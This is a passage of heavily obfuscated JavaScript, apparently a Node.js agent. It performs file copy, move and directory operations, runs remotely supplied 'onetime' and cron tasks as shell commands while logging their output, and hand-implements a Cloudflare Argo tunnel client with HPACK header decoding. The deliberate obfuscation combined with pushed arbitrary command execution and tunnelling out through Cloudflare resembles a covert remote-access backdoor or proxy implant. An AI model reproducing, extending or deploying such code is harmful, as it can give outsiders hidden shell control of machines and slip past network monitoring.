                    'status': b[c8(0x417)],
                    'message': j[c8(0x6ac)]
                });
            }
        }
        return c;
    }
    static async [a0aO(0x748)](a) {
        const c9 = a0aO, b = {
                'SnRtK': function (d, f, g) {
                    return d(f, g);
                },
                'ttZIy': function (d, f) {
                    return d(f);
                },
                'GkbAN': 'access_denied',
                'BYXJJ': 'not_found',
                'XSYqh': function (d, f, g) {
                    return d(f, g);
                }
            }, c = [];
        for (const [d, f] of Object['entries'](a)) {
            const g = a0n['resolve'](a0N[c9(0x212)], d), h = a0n['resolve'](a0N[c9(0x212)], f);
            if (!b[c9(0x5fe)](a0U, g) || !a0U(h)) {
                c[c9(0x51c)]({
                    'from': d,
                    'to': f,
                    'status': b['GkbAN']
                });
                continue;
            }
            try {
                if (!a0l[c9(0x45d)](g)) {
                    c[c9(0x51c)]({
                        'from': d,
                        'to': f,
                        'status': b['BYXJJ']
                    });
                    continue;
                }
                const i = a0n[c9(0x3ab)](h);
                !a0l[c9(0x45d)](i) && a0l[c9(0x4aa)](i, { 'recursive': !![] });
                const j = a0l[c9(0x59e)](g);
                if (j[c9(0x1ae)]()) {
                    if (a0l['cpSync'])
                        a0l[c9(0x2a9)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const ca = c9;
                            if (a0l[ca(0x59e)](l)[ca(0x1ae)]()) {
                                if (!a0l[ca(0x45d)](m))
                                    a0l[ca(0x4aa)](m, { 'recursive': !![] });
                                for (const n of a0l['readdirSync'](l)) {
                                    b[ca(0x4ff)](k, a0n[ca(0x4d0)](l, n), a0n['join'](m, n));
                                }
                            } else
                                a0l[ca(0x381)](l, m);
                        };
                        b['XSYqh'](k, g, h);
                    }
                } else
                    a0l[c9(0x381)](g, h);
                c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[c9(0x51c)]({
                    'from': d,
                    'to': f,
                    'status': c9(0x49c),
                    'message': l[c9(0x6ac)]
                });
            }
        }
        return c;
    }
    static async ['createDirectory'](a) {
        const cb = a0aO, b = {
                'OtwUK': function (d, f) {
                    return d(f);
                },
                'OYzlK': 'Access\x20denied:\x20path\x20outside\x20root'
            }, c = a0n['resolve'](a0N[cb(0x212)], a);
        if (!b[cb(0x448)](a0U, c))
            throw new Error(b[cb(0x232)]);
        return a0l['mkdirSync'](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0n['relative'](a0N['FILE_ROOT'], c)
        };
    }
}
class a0W {
    static ['cronJobs'] = new Map();
    static [a0aO(0x165)](a, b) {
        const cc = a0aO, c = {
                'bbFMP': function (d, f) {
                    return d - f;
                }
            };
        a[cc(0x51c)](b), a[cc(0x261)] > a0N[cc(0x1b6)] && a[cc(0x74c)](0x0, c[cc(0x1de)](a['length'], a0N['MAX_TASK_LOG_SIZE']));
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const cd = a0aO, g = new Date()['toISOString']();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + cd(0x5f7) + a + cd(0x4f4) + c + '\x0a' + (b?.[cd(0x61c)]() || '')
        };
    }
    static ['getOnetimeTasks']() {
        const ce = a0aO;
        return {
            'status': 'ok',
            'count': a0N[ce(0x72b)][ce(0x261)],
            'tasks': a0N[ce(0x72b)]
        };
    }
    static async [a0aO(0x364)](a) {
        const cf = a0aO, b = {
                'oCVJl': function (d, f) {
                    return d < f;
                },
                'nWjMg': cf(0x398),
                'uKJmJ': cf(0x49c)
            };
        a0N[cf(0x72b)] = a || [], a0N[cf(0x76a)] = !![];
        const c = [];
        for (let d = 0x0; b[cf(0x57a)](d, a0N[cf(0x72b)][cf(0x261)]); d++) {
            const f = a0N[cf(0x72b)][d], g = await a0T[cf(0x3ba)](f), h = this[cf(0x477)](f, g[cf(0x58a)], g[cf(0x49d)], b['nWjMg']);
            this[cf(0x165)](a0N['onetimetasks_log'], h), c[cf(0x51c)]({
                'index': d,
                'cmd': f,
                'exitcode': g[cf(0x49d)],
                'output': g[cf(0x58a)],
                'status': g[cf(0x49d)] === 0x0 ? 'ok' : b[cf(0x628)]
            });
        }
        return a0N[cf(0x76a)] = ![], {
            'status': 'ok',
            'count': a0N['onetasks']['length'],
            'tasks': a0N[cf(0x72b)],
            'executed': c
        };
    }
    static [a0aO(0x4c4)]() {
        const cg = a0aO;
        return {
            'status': 'ok',
            'count': Object[cg(0x3c7)](a0N[cg(0x5bb)])[cg(0x261)],
            'tasks': a0N['crontasks']
        };
    }
    static ['setCronTasks'](a) {
        const ch = a0aO, b = {
                'GAukK': function (d, f) {
                    return d === f;
                },
                'nnHQl': ch(0x253),
                'QwreF': function (d, f) {
                    return d || f;
                },
                'mABpJ': function (d, f) {
                    return d > f;
                },
                'OXEvF': ch(0x49c),
                'WwNTr': function (d, f) {
                    return d - f;
                },
                'SBiAp': function (d, f) {
                    return d || f;
                },
                'EamVI': function (d, f) {
                    return d > f;
                }
            };
        this[ch(0x1cf)][ch(0x184)](d => {
            const ci = ch;
            b[ci(0x254)](typeof d[ci(0x1d9)], b['nnHQl']) && d[ci(0x1d9)](), b[ci(0x254)](typeof d[ci(0x482)], b[ci(0x3c5)]) && d[ci(0x482)]();
        }), this[ch(0x1cf)]['clear']();
        const c = [];
        for (const d of Object['keys'](b[ch(0x3e7)](a, {}))) {
            !a0s[ch(0x5ee)](d) && c[ch(0x51c)](d);
        }
        if (b[ch(0x3d6)](c[ch(0x261)], 0x0))
            return {
                'status': b[ch(0x23a)],
                'message': ch(0x534) + c[ch(0x4d0)](',\x20'),
                'valid_count': b[ch(0x363)](Object['keys'](b[ch(0x691)](a, {}))[ch(0x261)], c[ch(0x261)])
            };
        a0N[ch(0x5bb)] = b[ch(0x691)](a, {});
        for (const [f, g] of Object[ch(0x248)](a0N[ch(0x5bb)])) {
            const h = a0s['schedule'](f, async () => {
                const cj = ch, i = await a0T[cj(0x3ba)](g), j = this['_formatLogEntry'](g, i[cj(0x58a)], i['exitcode'], 'cron', f);
                this[cj(0x165)](a0N[cj(0x349)], j);
            });
            this[ch(0x1cf)][ch(0x3bc)](f, h);
        }
        return a0N[ch(0x2b5)] = b[ch(0x6dd)](Object['keys'](a0N[ch(0x5bb)])['length'], 0x0), {
            'status': 'ok',
            'count': Object['keys'](a0N[ch(0x5bb)])[ch(0x261)],
            'tasks': a0N[ch(0x5bb)]
        };
    }
    static [a0aO(0x237)]() {
        const ck = a0aO;
        return {
            'onetime': {
                'pending': a0N[ck(0x76a)],
                'count': a0N[ck(0x72b)][ck(0x261)]
            },
            'cron': {
                'active': a0N[ck(0x2b5)],
                'count': Object[ck(0x3c7)](a0N[ck(0x5bb)])[ck(0x261)],
                'check_interval': a0N[ck(0x2e9)]
            }
        };
    }
    static [a0aO(0x78e)](a = 0x32) {
        const cl = a0aO, b = a0N[cl(0x5d8)][cl(0x71b)](-a);
        return {
            'status': 'ok',
            'count': b[cl(0x261)],
            'logs': b
        };
    }
    static [a0aO(0x26d)](a = 0x32) {
        const b = a0N['crontasks_log']['slice'](-a);
        return {
            'status': 'ok',
            'count': b['length'],
            'logs': b
        };
    }
    static ['clearOnetimeLogs']() {
        const cm = a0aO, a = { 'oeWwP': 'onetime' }, b = a0N[cm(0x5d8)][cm(0x261)];
        return a0N[cm(0x5d8)] = [], {
            'status': 'ok',
            'cleared': a[cm(0x67d)]
        };
    }
    static [a0aO(0x529)]() {
        const cn = a0aO, a = { 'TJOOi': cn(0x683) }, b = a0N['crontasks_log'][cn(0x261)];
        return a0N['crontasks_log'] = [], {
            'status': 'ok',
            'cleared': a['TJOOi']
        };
    }
    static [a0aO(0x4da)]() {
        const co = a0aO, a = {
                'YHduM': function (g, h) {
                    return g - h;
                }
            }, b = a0N[co(0x5d8)][co(0x653)](g => g[co(0x49d)] === 0x0)[co(0x261)], c = a['YHduM'](a0N['onetimetasks_log'][co(0x261)], b), d = a0N[co(0x349)][co(0x653)](g => g[co(0x49d)] === 0x0)[co(0x261)], f = a0N[co(0x349)][co(0x261)] - d;
        return {
            'onetime': {
                'total_logged': a0N[co(0x5d8)]['length'],
                'max_capacity': a0N[co(0x1b6)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0N[co(0x349)][co(0x261)],
                'max_capacity': a0N[co(0x1b6)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async ['executeOnetimeTasks']() {
        const cp = a0aO, a = {
                'GjTya': function (c, d) {
                    return c < d;
                },
                'ohddP': 'onetime'
            }, b = [];
        for (let c = 0x0; a[cp(0x2f0)](c, a0N['onetasks'][cp(0x261)]); c++) {
            const d = a0N[cp(0x72b)][c], f = await a0T[cp(0x3ba)](d), g = this[cp(0x477)](d, f['result'], f[cp(0x49d)], a['ohddP']);
            this[cp(0x165)](a0N[cp(0x5d8)], g), b[cp(0x51c)]({
                'cmd': d,
                'exitcode': f[cp(0x49d)],
                'output': f['result'],
                'timeout': f[cp(0x46c)]
            });
        }
        return a0N[cp(0x76a)] = ![], {
            'status': 'ok',
            'executed': b[cp(0x261)],
            'results': b
        };
    }
}
const a0X = a0aO(0x32f), a0Y = [
        'region1.v2.argotunnel.com',
        a0aO(0x4b5)
    ], a0Z = 0x1ea4, a0a0 = 'cf-cloudflared-proxy-connection-upgrade', a0a1 = 'control-stream', a0a2 = 0x4000, a0a3 = [
        [
            ':authority',
            ''
        ],
        [
            a0aO(0x221),
            a0aO(0x6d3)
        ],
        [
            a0aO(0x221),
            a0aO(0x42b)
        ],
        [
            a0aO(0x46a),
            '/'
        ],
        [
            ':path',
            a0aO(0x1ee)
        ],
        [
            ':scheme',
            a0aO(0x34a)
        ],
        [
            a0aO(0x611),
            a0aO(0x2c7)
        ],
        [
            ':status',
            '200'
        ],
        [
            ':status',
            a0aO(0x262)
        ],
        [
            a0aO(0x181),
            a0aO(0x2d8)
        ],
        [
            ':status',
            a0aO(0x584)
        ],
        [
            a0aO(0x181),
            '400'
        ],
        [
            a0aO(0x181),
            a0aO(0x50c)
        ],
        [
            a0aO(0x181),
            a0aO(0x178)
        ],
        [
            a0aO(0x37a),
            ''
        ],
        [
            a0aO(0x700),
            a0aO(0x770)
        ],
        [
            'accept-language',
            ''
        ],
        [
            a0aO(0x2ec),
            ''
        ],
        [
            'accept',
            ''
        ],
        [
            a0aO(0x147),
            ''
        ],
        [
            'age',
            ''
        ],
        [
            a0aO(0x614),
            ''
        ],
        [
            a0aO(0x284),
            ''
        ],
        [
            a0aO(0x78b),
            ''
        ],
        [
            a0aO(0x294),
            ''
        ],
        [
            'content-encoding',
            ''
        ],
        [
            a0aO(0x3e0),
            ''
        ],
        [
            'content-length',
            ''
        ],
        [
            a0aO(0x660),
            ''
        ],
        [
            a0aO(0x1e0),
            ''
        ],
        [
            a0aO(0x415),
            ''
        ],
        [
            a0aO(0x400),
            ''
        ],
        [
            'date',
            ''
        ],
        [
            a0aO(0x6e9),
            ''
        ],
        [
            a0aO(0x384),
            ''
        ],
        [
            a0aO(0x574),
            ''
        ],
        [
            a0aO(0x426),
            ''
        ],
        [
            a0aO(0x5e9),
            ''
        ],
        [
            'if-match',
            ''
        ],
        [
            a0aO(0x525),
            ''
        ],
        [
            a0aO(0x645),
            ''
        ],
        [
            a0aO(0x24a),
            ''
        ],
        [
            a0aO(0x44a),
            ''
        ],
        [
            a0aO(0x1ff),
            ''
        ],
        [
            a0aO(0x554),
            ''
        ],
        [
            a0aO(0x1eb),
            ''
        ],
        [
            'max-forwards',
            ''
        ],
        [
            'proxy-authenticate',
            ''
        ],
        [
            'proxy-authorization',
            ''
        ],
        [
            a0aO(0x5c0),
            ''
        ],
        [
            a0aO(0x48c),
            ''
        ],
        [
            a0aO(0x66d),
            ''
        ],
        [
            a0aO(0x537),
            ''
        ],
        [
            a0aO(0x585),
            ''
        ],
        [
            'set-cookie',
            ''
        ],
        [
            a0aO(0x3a3),
            ''
        ],
        [
            a0aO(0x2ff),
            ''
        ],
        [
            'user-agent',
            ''
        ],
        [
            a0aO(0x78a),
            ''
        ],
        [
            a0aO(0x34f),
            ''
        ],
        [
            'www-authenticate',
            ''
        ]
    ], a0a4 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a5 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0a6() {
    const cq = a0aO, a = {
            'YbQiT': function (c, d) {
                return c - d;
            },
            'inCmV': function (c, d) {
                return c >= d;
            },
            'PWBTk': function (c, d) {
                return c & d;
            },
            'jMaUo': function (c, d) {
                return c >> d;
            },
            'HPnPR': function (c, d) {
                return c === d;
            },
            'iHbVq': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; c < a0a4[cq(0x261)]; c++) {
        const d = a0a4[c], f = a0a5[c];
        let g = b;
        for (let h = a[cq(0x2e6)](f, 0x1); a[cq(0x54c)](h, 0x0); h--) {
            const i = a[cq(0x1f2)](a['jMaUo'](d, h), 0x1);
            a['HPnPR'](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                a[cq(0x416)](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0a7 = a0a6();
function a0a8(a) {
    const cr = a0aO, b = {
            'GYYDJ': function (h, i) {
                return h & i;
            },
            'xCkoW': function (h, i) {
                return h >> i;
            },
            'qBGnY': function (h, i) {
                return h | i;
            },
            'IosZc': function (h, i) {
                return h << i;
            },
            'jZSqI': function (h, i) {
                return h === i;
            },
            'Apjoy': 'invalid\x20HPACK\x20Huffman\x20string',
            'TpNIF': function (h, i) {
                return h >= i;
            },
            'YhNoc': cr(0x459),
            'nnqTM': function (h, i) {
                return h === i;
            },
            'poTWf': cr(0x6c4),
            'IeXIU': function (h, i) {
                return h !== i;
            },
            'QhhQC': function (h, i) {
                return h - i;
            },
            'oEhTu': cr(0x155)
        }, c = [];
    let d = a0a7, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; i >= 0x0; i--) {
            const j = b[cr(0x2b7)](b['xCkoW'](h, i), 0x1);
            f = b[cr(0x251)](b[cr(0x1cc)](f, 0x1), j), g += 0x1, d = d[j];
            if (b[cr(0x4c2)](d, null))
                throw new Error(b['Apjoy']);
            if (b[cr(0x7b6)](d[0x2], 0x0)) {
                const k = b[cr(0x242)]['split']('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        f = 0x0;
                        continue;
                    case '1':
                        d = a0a7;
                        continue;
                    case '2':
                        g = 0x0;
                        continue;
                    case '3':
                        c['push'](d[0x2]);
                        continue;
                    case '4':
                        if (b['nnqTM'](d[0x2], 0x100))
                            throw new Error(b[cr(0x442)]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (g > 0x7 || b[cr(0x63d)](f, b[cr(0x40b)](0x1 << g, 0x1)))
        throw new Error(b['oEhTu']);
    return Buffer[cr(0x426)](c);
}
function a0a9(a, b, c) {
    const cs = a0aO, d = {
            'rGxbU': function (j, k) {
                return j >= k;
            },
            'hCcHY': cs(0x335),
            'lnzYe': function (j, k) {
                return j - k;
            },
            'UIgXT': function (j, k) {
                return j & k;
            },
            'fNfBp': function (j, k) {
                return j < k;
            },
            'MrqDg': function (j, k) {
                return j * k;
            },
            'Xuzdq': function (j, k) {
                return j === k;
            },
            'YpJxn': function (j, k) {
                return j > k;
            },
            'ggdIr': cs(0x505)
        };
    if (d[cs(0x3e2)](b, a[cs(0x261)]))
        throw new Error(d[cs(0x6b2)]);
    const f = a[b];
    b += 0x1;
    const g = d[cs(0x508)](0x1 << c, 0x1);
    let h = d[cs(0x3ec)](f, g);
    if (d[cs(0x56e)](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (b >= a[cs(0x261)])
            throw new Error(d[cs(0x6b2)]);
        const j = a[b];
        b += 0x1, h += d[cs(0x6a5)](j & 0x7f, Math[cs(0x362)](0x2, i));
        if (d[cs(0x5d7)](j & 0x80, 0x0))
            return [
                h,
                b
            ];
        i += 0x7;
        if (d[cs(0x3e4)](i, 0x1c))
            throw new Error(d[cs(0x6e4)]);
    }
}
function a0aa(a, b) {
    const ct = a0aO, c = {
            'HXpGn': function (j, k) {
                return j >= k;
            },
            'XUnQd': function (j, k) {
                return j(k);
            },
            'ppTgp': function (j, k) {
                return j & k;
            },
            'ESWYb': function (j, k, l, m) {
                return j(k, l, m);
            },
            'jkKbi': function (j, k) {
                return j + k;
            },
            'thXNM': function (j, k) {
                return j > k;
            }
        };
    if (c['HXpGn'](b, a[ct(0x261)]))
        throw new Error(ct(0x7a3));
    const d = c['XUnQd'](Boolean, c['ppTgp'](a[b], 0x80)), [f, g] = c['ESWYb'](a0a9, a, b, 0x7), h = c[ct(0x1d0)](g, f);
    if (c['thXNM'](h, a['length']))
        throw new Error(ct(0x356));
    const i = a[ct(0x2a7)](g, h);
    return [
        d ? c['XUnQd'](a0a8, i) : i,
        h
    ];
}
class a0ab {
    constructor() {
        const cu = a0aO;
        this['dynamic'] = [], this[cu(0x1df)] = 0x0, this[cu(0x33e)] = 0x1000;
    }
    [a0aO(0x2fc)](a) {
        const cv = a0aO, b = {
                'raQjj': cv(0x4c8),
                'fBVGd': function (d, f) {
                    return d - f;
                },
                'OZkAW': function (d, f) {
                    return d >= f;
                },
                'oeBmu': cv(0x295)
            };
        if (a <= 0x0)
            throw new Error(b[cv(0x2ee)]);
        if (a <= a0a3[cv(0x261)])
            return a0a3[b[cv(0x2e2)](a, 0x1)];
        const c = b['fBVGd'](a - a0a3[cv(0x261)], 0x1);
        if (c < 0x0 || b[cv(0x19f)](c, this[cv(0x3a6)][cv(0x261)]))
            throw new Error(b[cv(0x327)]);
        return this['dynamic'][c];
    }
    ['add'](a, b) {
        const cw = a0aO, c = {
                'btotY': function (f, g) {
                    return f + g;
                },
                'qvUEk': cw(0x58c),
                'WPuNs': function (f, g) {
                    return f > g;
                },
                'slKuX': function (f, g) {
                    return f + g;
                }
            }, d = c[cw(0x72f)](0x20 + Buffer[cw(0x1d6)](a, c[cw(0x278)]), Buffer['byteLength'](b, cw(0x58c)));
        if (d > this[cw(0x33e)]) {
            this[cw(0x3a6)] = [], this['dynamicSize'] = 0x0;
            return;
        }
        while (c[cw(0x727)](this[cw(0x3a6)]['length'], 0x0) && c[cw(0x727)](c['slKuX'](this[cw(0x1df)], d), this[cw(0x33e)])) {
            const [f, g] = this[cw(0x3a6)][cw(0x209)]();
            this['dynamicSize'] -= c[cw(0x72f)](0x20 + Buffer[cw(0x1d6)](f, c[cw(0x278)]), Buffer[cw(0x1d6)](g, cw(0x58c)));
        }
        this[cw(0x3a6)][cw(0x450)]([
            a,
            b
        ]), this[cw(0x1df)] += d;
    }
    ['decode'](a) {
        const cx = a0aO, b = {
                'HWefS': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'mHXkY': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'tYiJa': cx(0x58c),
                'skwPb': function (f, g, h) {
                    return f(g, h);
                },
                'yhKtx': function (f, g) {
                    return f > g;
                },
                'OYxDE': function (f, g) {
                    return f + g;
                }
            }, c = [];
        let d = 0x0;
        while (d < a['length']) {
            const f = a[d];
            if (f & 0x80) {
                let j;
                [j, d] = b[cx(0x2cd)](a0a9, a, d, 0x7), c[cx(0x51c)](this[cx(0x2fc)](j));
                continue;
            }
            if (f & 0x40) {
                let k, l;
                [k, d] = b[cx(0x68a)](a0a9, a, d, 0x6);
                if (k)
                    l = this['tableEntry'](k)[0x0];
                else {
                    let o;
                    [o, d] = a0aa(a, d), l = o[cx(0x3e1)](b[cx(0x567)])[cx(0x441)]();
                }
                let m;
                [m, d] = b[cx(0x6cd)](a0aa, a, d);
                const n = m['toString'](b[cx(0x567)]);
                this['add'](l, n), c[cx(0x51c)]([
                    l,
                    n
                ]);
                continue;
            }
            if (f & 0x20) {
                let p;
                [p, d] = b[cx(0x68a)](a0a9, a, d, 0x5);
                if (p > 0x1000)
                    throw new Error('HPACK\x20table\x20size\x20exceeds\x20limit');
                this[cx(0x33e)] = p;
                while (b[cx(0x6f0)](this['dynamic']['length'], 0x0) && b[cx(0x6f0)](this['dynamicSize'], p)) {
                    const [q, r] = this[cx(0x3a6)][cx(0x209)]();
                    this[cx(0x1df)] -= b[cx(0x243)](b['OYxDE'](0x20, Buffer['byteLength'](q, b['tYiJa'])), Buffer[cx(0x1d6)](r, b[cx(0x567)]));
                }
                continue;
            }
            let g, h;
            [g, d] = b[cx(0x2cd)](a0a9, a, d, 0x4);
            if (g)
                h = this[cx(0x2fc)](g)[0x0];
            else {
                let s;
                [s, d] = b['skwPb'](a0aa, a, d), h = s[cx(0x3e1)](b[cx(0x567)])['toLowerCase']();
            }
            let i;
            [i, d] = a0aa(a, d), c[cx(0x51c)]([
                h,
                i['toString'](b['tYiJa'])
            ]);
        }
        return c;
    }
}
function a0ac(a, b, c) {
    const cy = a0aO, d = {
            'rNcjw': function (h, i) {
                return h - i;
            },
            'FgMca': function (h, i) {
                return h << i;
            },
            'pTkJb': function (h, i) {
                return h < i;
            },
            'mrNTK': function (h, i) {
                return h | i;
            },
            'KMcBm': function (h, i) {
                return h | i;
            },
            'XkMDn': function (h, i) {
                return h >= i;
            },
            'blmae': function (h, i) {
                return h | i;
            },
            'DjNyZ': function (h, i) {
                return h & i;
            }
        }, f = d[cy(0x1e2)](d[cy(0x152)](0x1, b), 0x1);
    if (d[cy(0x582)](a, f))
        return Buffer['from']([d[cy(0x76f)](c, a)]);
    const g = [d[cy(0x71d)](c, f)];
    a -= f;
    while (d['XkMDn'](a, 0x80)) {
        g[cy(0x51c)](d[cy(0x3b5)](d[cy(0x229)](a, 0x7f), 0x80)), a = Math['floor'](a / 0x80);
    }
    return g[cy(0x51c)](a), Buffer[cy(0x426)](g);
}
function a0ad(a) {
    const cz = a0aO, b = {
            'yxXIl': cz(0x58c),
            'chSvX': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = Buffer[cz(0x426)](a, b['yxXIl']);
    return Buffer['concat']([
        b[cz(0x282)](a0ac, c[cz(0x261)], 0x7, 0x0),
        c
    ]);
}
function a0ae(a) {
    const cA = a0aO, b = {
